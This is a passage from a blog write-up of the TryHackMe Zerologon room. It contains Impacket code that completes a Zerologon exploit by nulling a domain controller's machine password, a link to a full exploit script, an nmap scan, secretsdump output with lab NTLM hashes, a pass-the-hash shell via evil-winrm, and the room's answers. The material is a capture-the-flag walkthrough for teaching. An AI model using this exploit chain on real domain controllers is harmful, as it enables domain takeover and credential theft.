</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hNetrServerPasswordSet2</span><span class=p>(</span><span class=n>dce</span><span class=p>,</span> <span class=n>primaryName</span><span class=p>,</span> <span class=n>accountName</span><span class=p>,</span> <span class=n>secureChannelType</span><span class=p>,</span> <span class=n>computerName</span><span class=p>,</span> <span class=n>authenticator</span><span class=p>,</span> <span class=n>clearNewPasswordBlob</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span> <span class=o>=</span> <span class=n>NetrServerPasswordSet2</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;PrimaryName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>checkNullString</span><span class=p>(</span><span class=n>primaryName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;AccountName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>checkNullString</span><span class=p>(</span><span class=n>accountName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;SecureChannelType&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>secureChannelType</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;ComputerName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>checkNullString</span><span class=p>(</span><span class=n>computerName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;Authenticator&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>authenticator</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=p>[</span><span class=s1>&#39;ClearNewPassword&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>clearNewPasswordBlob</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>dce</span><span class=o>.</span><span class=n>request</span><span class=p>(</span><span class=n>request</span><span class=p>)</span>
</span></span></code></pre></div><p>As expected, most of the field names are the same as what Microsoft provided, except with some differences. Next, we need to know how to structure the Authenticator portion as well:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>NETLOGON_AUTHENTICATOR</span><span class=p>(</span><span class=n>NDRSTRUCT</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>structure</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;Credential&#39;</span><span class=p>,</span> <span class=n>NETLOGON_CREDENTIAL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;Timestamp&#39;</span><span class=p>,</span> <span class=n>DWORD</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span></code></pre></div><p>The format here is a little bit different compared to the prior, but we&rsquo;ll adjust accordingly when we go to slot it into the PoC, but while we&rsquo;re talking about slotting it into the PoC, where will our added code go?</p><p>Our added code will go immediately before &ldquo;return rpc_con&rdquo; on line 45. This is where we know we have successful authentication, we want to grab that before we return to the previous function and terminate the RPC connection. Now that we know all the required information that we&rsquo;ll need to add to the PoC, we&rsquo;ll save you the painstaking effort of writing your own code, and you can use the pre-written code below. The above explanations should help aid in understanding it.</p><p><strong>The Additional Code we&rsquo;re slotting in:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>newPassRequest</span> <span class=o>=</span> <span class=n>nrpc</span><span class=o>.</span><span class=n>NetrServerPasswordSet2</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;PrimaryName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>dc_handle</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;AccountName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>target_computer</span> <span class=o>+</span> <span class=s1>&#39;$</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;SecureChannelType&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>nrpc</span><span class=o>.</span><span class=n>NETLOGON_SECURE_CHANNEL_TYPE</span><span class=o>.</span><span class=n>ServerSecureChannel</span>
</span></span><span class=line><span class=cl>    <span class=n>auth</span> <span class=o>=</span> <span class=n>nrpc</span><span class=o>.</span><span class=n>NETLOGON_AUTHENTICATOR</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>auth</span><span class=p>[</span><span class=s1>&#39;Credential&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>auth</span><span class=p>[</span><span class=s1>&#39;Timestamp&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;Authenticator&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>auth</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;ComputerName&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>target_computer</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>newPassRequest</span><span class=p>[</span><span class=s1>&#39;ClearNewPassword&#39;</span><span class=p>]</span> <span class=o>=</span>  <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>516</span>
</span></span><span class=line><span class=cl>    <span class=n>rpc_con</span><span class=o>.</span><span class=n>request</span><span class=p>(</span><span class=n>newPassRequest</span><span class=p>)</span>
</span></span></code></pre></div><p>At this point, your code should be good to go, and you should be able to successfully exploit Zero Logon. If you are still having issues, you can use the following code found here:</p><p><a href=https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py>https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py</a></p><h3 id=answers>Answers<a hidden class=anchor aria-hidden=true href=#answers>#</a></h3><p><img alt=Flag loading=lazy src=https://raw.githubusercontent.com/anir0y/thm-notes/main/zerologon/img/Pasted%20image%2020210509234755.png></p><hr><h2 id=lab-it-up>Lab it UP!<a hidden class=anchor aria-hidden=true href=#lab-it-up>#</a></h2><h3 id=nmap-result>Nmap Result<a hidden class=anchor aria-hidden=true href=#nmap-result>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sC -sV -oA nmap/DC01HOLOLIVE 10.10.129.187 
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-05-09 23:51 IST
</span></span><span class=line><span class=cl>Stats: 0:00:56 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Script Scan
</span></span><span class=line><span class=cl>NSE Timing: About 99.26% <span class=k>done</span><span class=p>;</span> ETC: 23:52 <span class=o>(</span>0:00:00 remaining<span class=o>)</span>
</span></span><span class=line><span class=cl>Stats: 0:00:56 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Script Scan
</span></span><span class=line><span class=cl>NSE Timing: About 99.26% <span class=k>done</span><span class=p>;</span> ETC: 23:52 <span class=o>(</span>0:00:00 remaining<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.129.187
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.16s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>987</span> closed ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp   open  domain        Simple DNS Plus
</span></span><span class=line><span class=cl>80/tcp   open  http          Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2021-05-09 18:21:42Z<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: hololive.local0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5?
</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp  open  tcpwrapped
</span></span><span class=line><span class=cl>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: hololive.local0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>3269/tcp open  tcpwrapped
</span></span><span class=line><span class=cl>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: DC01
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: DC01.hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2021-05-09T18:22:11+00:00
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>DC01.hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-05-08T18:20:30
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2021-11-07T18:20:30
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2021-05-09T18:22:20+00:00<span class=p>;</span> 0s from scanner time.
</span></span><span class=line><span class=cl>Service Info: Host: DC01<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.02: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2021-05-09T18:22:11
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 78.14 seconds
</span></span></code></pre></div><hr><h3 id=what-is-the-netbios-name-of-the-domain-controller>What is the NetBIOS name of the Domain Controller?<a hidden class=anchor aria-hidden=true href=#what-is-the-netbios-name-of-the-domain-controller>#</a></h3><h4 id=ans-dc01>ANS: DC01<a hidden class=anchor aria-hidden=true href=#ans-dc01>#</a></h4><p><strong>Explanation</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#Nmap snip </span>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span><span class=line><span class=cl>.3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: <span class=s2>&#34;DC01&#34;</span> <span class=c1>#Here is the ans</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: DC01.hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2021-05-09T18:22:11+00:00
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span></code></pre></div><hr><h3 id=what-is-the-netbios-domain-name-of-the-network>What is the NetBIOS domain name of the network?<a hidden class=anchor aria-hidden=true href=#what-is-the-netbios-domain-name-of-the-network>#</a></h3><h4 id=ans-hololive>ANS: HOLOLIVE<a hidden class=anchor aria-hidden=true href=#ans-hololive>#</a></h4><p><strong>Explanation</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#Nmap snip </span>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span><span class=line><span class=cl>.3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: <span class=s2>&#34;HOLOLIVE&#34;</span> <span class=c1>#Here is the ans</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: DC01 
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: DC01.hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2021-05-09T18:22:11+00:00
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span></code></pre></div><hr><h3 id=what-domain-are-you-attacking>What domain are you attacking?<a hidden class=anchor aria-hidden=true href=#what-domain-are-you-attacking>#</a></h3><h4 id=ans-hololivelocal>ANS: hololive.local<a hidden class=anchor aria-hidden=true href=#ans-hololivelocal>#</a></h4><p><strong>Explanation</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#Nmap snip </span>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span><span class=line><span class=cl>.3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: HOLOLIVE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: HOLOLIVE 
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: DC01 
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: <span class=s2>&#34;hololive.local&#34;</span> <span class=c1># ANS</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: DC01.hololive.local
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2021-05-09T18:22:11+00:00
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span></code></pre></div><hr><h3 id=what-is-the-local-administrators-ntlm-hash>What is the Local Administrator&rsquo;s NTLM hash?<a hidden class=anchor aria-hidden=true href=#what-is-the-local-administrators-ntlm-hash>#</a></h3><h4 id=ans--3f3ef89114fb063e3d7fc23c20f65568>ANS: 3f3ef89114fb063e3d7fc23c20f65568<a hidden class=anchor aria-hidden=true href=#ans--3f3ef89114fb063e3d7fc23c20f65568>#</a></h4><p><strong>Explanation</strong></p><h4 id=activate-venv>Activate Venv<a hidden class=anchor aria-hidden=true href=#activate-venv>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>source</span> impacketEnv/bin/activate
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>impacketEnv<span class=o>)</span> ┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>mentor@attackerVM<span class=o>]</span>─<span class=o>[</span>~/thm/zer0login<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$python3</span> zeroLogon.py DC01 10.10.129.187
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> _____                   __                         
</span></span><span class=line><span class=cl>/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __  
</span></span><span class=line><span class=cl><span class=se>\/</span>/ / / _ <span class=se>\ </span><span class=s1>&#39;__/ _ \   / /  / _ \ / _` |/ _ \| &#39;</span>_ <span class=se>\ </span>
</span></span><span class=line><span class=cl> / //<span class=se>\ </span> __/ <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> / /__<span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>/____/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>__/  <span class=se>\_</span>___/<span class=se>\_</span>__/ <span class=se>\_</span>_, <span class=p>|</span><span class=se>\_</span>__/<span class=p>|</span>_<span class=p>|</span> <span class=p>|</span>_<span class=p>|</span>
</span></span><span class=line><span class=cl>                                  <span class=p>|</span>___/             
</span></span><span class=line><span class=cl>                Vulnerability Discovered by Tom Tervoort
</span></span><span class=line><span class=cl>                              Exploit by Ronnie Bartwitz
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>Performing authentication attempts...
</span></span><span class=line><span class=cl>Failure to Autheticate at attempt number: <span class=m>28</span>
</span></span><span class=line><span class=cl>Failure to Autheticate at attempt number: <span class=m>86</span>
</span></span><span class=line><span class=cl>Zero Logon successfully exploited, changing password.
</span></span></code></pre></div><h3 id=password-dumping>Password dumping:<a hidden class=anchor aria-hidden=true href=#password-dumping>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>╼ <span class=nv>$secretsdump</span>.py -just-dc -no-pass DC01<span class=se>\$</span>@10.10.129.187
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping Domain Credentials <span class=o>(</span>domain<span class=se>\u</span>id:rid:lmhash:nthash<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class=s2>&#34;3f3ef89114fb063e3d7fc23c20f65568&#34;</span>:::
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::
</span></span><span class=line><span class=cl>hololive.local<span class=se>\a</span>-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
</span></span><span class=line><span class=cl>hololive.local<span class=se>\a</span>-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd:::
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Cleaning up... 
</span></span></code></pre></div><hr><h3 id=how-many-domain-admin-accounts-are-there>How many Domain Admin accounts are there?<a hidden class=anchor aria-hidden=true href=#how-many-domain-admin-accounts-are-there>#</a></h3><h4 id=ans--2>ANS: 2<a hidden class=anchor aria-hidden=true href=#ans--2>#</a></h4><p><strong>Explaination</strong></p><p>Naming policy, Administrator accounts are having &lsquo;A-&rsquo; as Firt initial.</p><hr><h3 id=what-is-the-root-flag>What is the root flag?<a hidden class=anchor aria-hidden=true href=#what-is-the-root-flag>#</a></h3><h4 id=ans>ANS:<a hidden class=anchor aria-hidden=true href=#ans>#</a></h4><h3 id=pass-the-hash>Pass the Hash<a hidden class=anchor aria-hidden=true href=#pass-the-hash>#</a></h3><h4 id=evil-winrm-with-ntlm-hash>Evil-WinRm with NTLM Hash!<a hidden class=anchor aria-hidden=true href=#evil-winrm-with-ntlm-hash>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>mentor@attackerVM<span class=o>]</span>─<span class=o>[</span>~/thm/zer0login<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$evil</span>-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.129.187 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Evil-WinRM shell v2.4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; dir
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ../Desktop
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; dir
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                -------------         ------ ----
</span></span><span class=line><span class=cl>-a----        9/20/2020   2:02 PM             <span class=m>24</span> root.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; <span class=nb>type</span> root.txt
</span></span><span class=line><span class=cl><span class=s2>&#34;THM{DELTED_FOR_FLAG_PROTECTION}&#34;</span>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; 
</span></span></code></pre></div><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div><footer class=post-footer><ul class=post-tags><li><a href=https://classroom.anir0y.in/tags/notes/>Notes</a></li><li><a href=https://classroom.anir0y.in/tags/tryhackme/>Tryhackme</a></li><li><a href=https://classroom.anir0y.in/tags/rooms/>Rooms</a></li></ul><nav class=paginav><a class=prev href=https://classroom.anir0y.in/post/thm-room-openvas/><span class=title>« Prev</span><br><span>Try Hack Me Room Room Openvas</span>
</a><a class=next href=https://classroom.anir0y.in/post/cyber-security-interview-questions-with-answers/><span class=title>Next »</span><br><span>Cyber Security Interview Questions With Answers</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack ME Room Zerologon on x" href="https://x.com/intent/tweet/?text=Try%20Hack%20ME%20Room%20Zerologon&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-zerologon%2f&amp;hashtags=notes%2ctryhackme%2crooms"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack ME Room Zerologon on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-zerologon%2f&amp;title=Try%20Hack%20ME%20Room%20Zerologon&amp;summary=Try%20Hack%20ME%20Room%20Zerologon&amp;source=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-zerologon%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack ME Room Zerologon on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-zerologon%2f&title=Try%20Hack%20ME%20Room%20Zerologon"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack ME Room Zerologon on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-zerologon%2f"><svg 